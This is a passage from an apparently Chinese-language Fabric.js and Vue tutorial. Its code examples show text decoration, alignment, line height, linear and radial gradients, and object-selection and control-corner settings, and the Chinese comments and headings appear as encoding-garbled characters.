<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8af97b9f7c554724a5b72fd219445da9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=ZLf3l9QixmcOBqD6iEPsrbM7R7Y%3D" alt="030.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// ä¸Šåˆ’çº¿</span>
  <span class="hljs-keyword">const</span> overline = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'ä¸Šåˆ’çº¿'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">overline</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ä¸Šåˆ’çº¿</span>
  })

  <span class="hljs-comment">// ä¸‹åˆ’çº¿</span>
  <span class="hljs-keyword">const</span> underline = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'ä¸‹åˆ’çº¿'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">underline</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// ä¸‹åˆ’çº¿</span>
  })

  <span class="hljs-comment">// åˆ é™¤çº¿</span>
  <span class="hljs-keyword">const</span> linethrough = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(<span class="hljs-string">'åˆ é™¤çº¿'</span>, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">linethrough</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// åˆ é™¤çº¿</span>
  })

  <span class="hljs-comment">// å·¦å¯¹é½</span>
  <span class="hljs-keyword">const</span> msg1 = <span class="hljs-string">'å·¦\nå·¦å·¦\nå·¦å¯¹é½'</span>
  <span class="hljs-keyword">const</span> left = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg1, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'left'</span>, <span class="hljs-comment">// å·¦å¯¹é½</span>
  })

  <span class="hljs-comment">// å±…ä¸­å¯¹é½</span>
  <span class="hljs-keyword">const</span> msg2 = <span class="hljs-string">'ä¸­\nä¸­ä¸­\nå±…ä¸­å¯¹é½'</span>
  <span class="hljs-keyword">const</span> center = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg2, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'center'</span>,<span class="hljs-comment">// å±…ä¸­å¯¹é½</span>
  })

  <span class="hljs-comment">// å³å¯¹é½</span>
  <span class="hljs-keyword">const</span> msg3 = <span class="hljs-string">'å³\nå³å³\nå³å¯¹é½'</span>
  <span class="hljs-keyword">const</span> right = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg3, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">textAlign</span>: <span class="hljs-string">'right'</span>, <span class="hljs-comment">// å³å¯¹é½</span>
  })

  <span class="hljs-comment">// æ–‡æœ¬å†…å®¹</span>
  <span class="hljs-keyword">const</span> msg4 = <span class="hljs-string">"What are you doing,\nWhat are you doing,\nWhat are you doing\What are you doing"</span>
  
  <span class="hljs-keyword">const</span> lineHeight1 = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg4, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">250</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">lineHeight</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">// è¡Œé«˜</span>
  })

  <span class="hljs-keyword">const</span> lineHeight2 = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Text</span>(msg4, {
    <span class="hljs-attr">top</span>: <span class="hljs-number">250</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">300</span>,
    <span class="hljs-attr">fontSize</span>: <span class="hljs-number">16</span>,
    <span class="hljs-attr">lineHeight</span>: <span class="hljs-number">2</span>, <span class="hljs-comment">// è¡Œé«˜</span>
  })

  canvas.<span class="hljs-title function_">add</span>(
    overline,
    underline,
    linethrough,
    left,
    center,
    right,
    lineHeight1,
    lineHeight2
  )

}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-28">æ¸å˜</h2>
<h3 data-id="heading-29">çº¿æ€§æ¸å˜</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f8bfeccd8fe4efcbd40c0f9423ab083~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=szVZa%2BGCquQU%2Bw%2FFWJRXOQ7awCk%3D" alt="031.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// åœ†</span>
  <span class="hljs-keyword">let</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
  })

  <span class="hljs-comment">// çº¿æ€§æ¸å˜</span>
  <span class="hljs-keyword">let</span> gradient = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Gradient</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-string">'linear'</span>, <span class="hljs-comment">// linear or radial</span>
    <span class="hljs-attr">gradientUnits</span>: <span class="hljs-string">'pixels'</span>, <span class="hljs-comment">// pixels or pencentage åƒç´  æˆ–è€… ç™¾åˆ†æ¯”</span>
    <span class="hljs-attr">coords</span>: { <span class="hljs-attr">x1</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">y1</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">x2</span>: circle.<span class="hljs-property">width</span>, <span class="hljs-attr">y2</span>: <span class="hljs-number">0</span> }, <span class="hljs-comment">// è‡³å°‘2ä¸ªåæ ‡å¯¹ï¼ˆx1ï¼Œy1å’Œx2ï¼Œy2ï¼‰å°†å®šä¹‰æ¸å˜åœ¨å¯¹è±¡ä¸Šçš„æ‰©å±•æ–¹å¼</span>
    <span class="hljs-attr">colorStops</span>:[ <span class="hljs-comment">// å®šä¹‰æ¸å˜é¢œè‰²çš„æ•°ç»„</span>
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'red'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.2</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'orange'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.4</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'yellow'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.6</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'green'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0.8</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'blue'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'purple'</span> },
    ]
  })
  circle.<span class="hljs-title function_">set</span>(<span class="hljs-string">'fill'</span>, gradient);
  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-30">å¾„å‘æ¸å˜</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42c3e03aa82c47b9b3a0d700dad45491~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=nzxOW3Xl0qJx3Q521h2n33cLFQk%3D" alt="032.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"600"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// åœ†</span>
  <span class="hljs-keyword">let</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>,
  })

  <span class="hljs-keyword">let</span> gradient = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Gradient</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-string">'radial'</span>,
    <span class="hljs-attr">coords</span>: {
      <span class="hljs-attr">r1</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// è¯¥å±æ€§ä»…å¾„å‘æ¸å˜å¯ç”¨ï¼Œå¤–åœ†åŠå¾„</span>
      <span class="hljs-attr">r2</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// è¯¥å±æ€§ä»…å¾„å‘æ¸å˜å¯ç”¨ï¼Œå¤–åœ†åŠå¾„  </span>
      <span class="hljs-attr">x1</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// ç„¦ç‚¹çš„xåæ ‡</span>
      <span class="hljs-attr">y1</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// ç„¦ç‚¹çš„yåæ ‡</span>
      <span class="hljs-attr">x2</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// ä¸­å¿ƒç‚¹çš„xåæ ‡</span>
      <span class="hljs-attr">y2</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// ä¸­å¿ƒç‚¹çš„yåæ ‡</span>
    },
    <span class="hljs-attr">colorStops</span>: [
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#fee140'</span> },
      { <span class="hljs-attr">offset</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">color</span>: <span class="hljs-string">'#fa709a'</span> }
    ]
  })

  circle.<span class="hljs-title function_">set</span>(<span class="hljs-string">'fill'</span>, gradient);
  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-31">é€‰ä¸­çŠ¶æ€</h2>
<p><code>Fabric.js</code> åˆ›å»ºå‡ºæ¥çš„å…ƒç´ ï¼ˆå›¾å½¢ã€å›¾ç‰‡ã€ç»„ç­‰ï¼‰é»˜è®¤æ˜¯å¯ä»¥è¢«é€‰ä¸­çš„ã€‚</p>
<h3 data-id="heading-32">ç¦æ­¢é€‰ä¸­</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29b61e15621d43aaa8223c5a58f03946~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=Jx8kq56%2Fp0P65MScLDpENGRkZ24%3D" alt="055.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">200</span>,
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span>
  })

  <span class="hljs-comment">// å…ƒç´ ç¦æ­¢é€‰ä¸­</span>
  rect.<span class="hljs-property">selectable</span> = <span class="hljs-literal">false</span>

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-33">æ¡†é€‰æ ·å¼</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)

  canvas.<span class="hljs-property">selection</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// ç”»å¸ƒæ˜¯å¦å¯é€‰ä¸­ã€‚é»˜è®¤trueï¼›false ä¸å¯é€‰ä¸­</span>
  canvas.<span class="hljs-property">selectionColor</span> = <span class="hljs-string">'rgba(106, 101, 216, 0.3)'</span> <span class="hljs-comment">// ç”»å¸ƒé¼ æ ‡æ¡†é€‰æ—¶çš„èƒŒæ™¯è‰²</span>
  canvas.<span class="hljs-property">selectionBorderColor</span> = <span class="hljs-string">"#1d2786"</span> <span class="hljs-comment">// ç”»å¸ƒé¼ æ ‡æ¡†é€‰æ—¶çš„è¾¹æ¡†é¢œè‰²</span>
  canvas.<span class="hljs-property">selectionLineWidth</span> = <span class="hljs-number">6</span> <span class="hljs-comment">// ç”»å¸ƒé¼ æ ‡æ¡†é€‰æ—¶çš„è¾¹æ¡†åšåº¦</span>
  canvas.<span class="hljs-property">selectionDashArray</span> = [<span class="hljs-number">30</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>] <span class="hljs-comment">// ç”»å¸ƒé¼ æ ‡æ¡†é€‰æ—¶è¾¹æ¡†è™šçº¿è§„åˆ™</span>
  canvas.<span class="hljs-property">selectionFullyContained</span> = <span class="hljs-literal">true</span> <span class="hljs-comment">// åªé€‰æ‹©å®Œå…¨åŒ…å«åœ¨æ‹–åŠ¨é€‰æ‹©çŸ©å½¢ä¸­çš„å½¢çŠ¶</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-34">è‡ªå®šä¹‰è¾¹å’Œæ§åˆ¶è§’æ ·å¼</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e167168d524a2285efc48c9b9b05b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=LN6GPJqFnGtQxwBi2qduohjxCw4%3D" alt="058.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  circle.<span class="hljs-title function_">set</span>({
    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'red'</span>, <span class="hljs-comment">// è¾¹æ¡†é¢œè‰²</span>
    <span class="hljs-attr">cornerColor</span>: <span class="hljs-string">'green'</span>, <span class="hljs-comment">// æ§åˆ¶è§’é¢œè‰²</span>
    <span class="hljs-attr">cornerSize</span>: <span class="hljs-number">10</span>, <span class="hljs-comment">// æ§åˆ¶è§’å¤§å°</span>
    <span class="hljs-attr">transparentCorners</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// æ§åˆ¶è§’å¡«å……è‰²ä¸é€æ˜</span>
  })

  canvas.<span class="hljs-title function_">add</span>(circle)

  canvas.<span class="hljs-title function_">setActiveObject</span>(circle) <span class="hljs-comment">// é€‰ä¸­åœ†</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-35">æ²¡æœ‰æ§åˆ¶è§’</h3>
<p>æ²¡æœ‰æ§åˆ¶è§’å°†æ„å‘³ç€æ— æ³•ç”¨é¼ æ ‡ç›´æ¥æ“ä½œç¼©æ”¾å’Œæ—‹è½¬ï¼Œåªå…è®¸ç§»åŠ¨æ“ä½œã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61e69490ee584fb9890c3308d9196820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=obBbGBiuo4KXQQ25Hg6piDjx%2FBQ%3D" alt="062.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// åœ†å½¢</span>
  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">radius</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'#f55'</span>,
    <span class="hljs-attr">top</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">70</span>
  })

  circle.<span class="hljs-property">hasControls</span> = <span class="hljs-literal">false</span> <span class="hljs-comment">// ç¦æ­¢æ§åˆ¶è§’</span>

  canvas.<span class="hljs-title function_">add</span>(circle)

  canvas.<span class="hljs-title function_">setActiveObject</span>(circle) <span class="hljs-comment">// é€‰ä¸­ç¬¬ä¸€é¡¹</span>
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-36">ä¸å…è®¸æ¡†é€‰</h3>
<p>ä¸å…è®¸ä»ç”»å¸ƒæ¡†é€‰ï¼Œä½†å…è®¸é€‰ä¸­å…ƒç´ ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7209ba9c7b674d478b40b80aef9771b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=KPZAwjTdaEyCwGrOncks3kYVeyE%3D" alt="065.gif" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

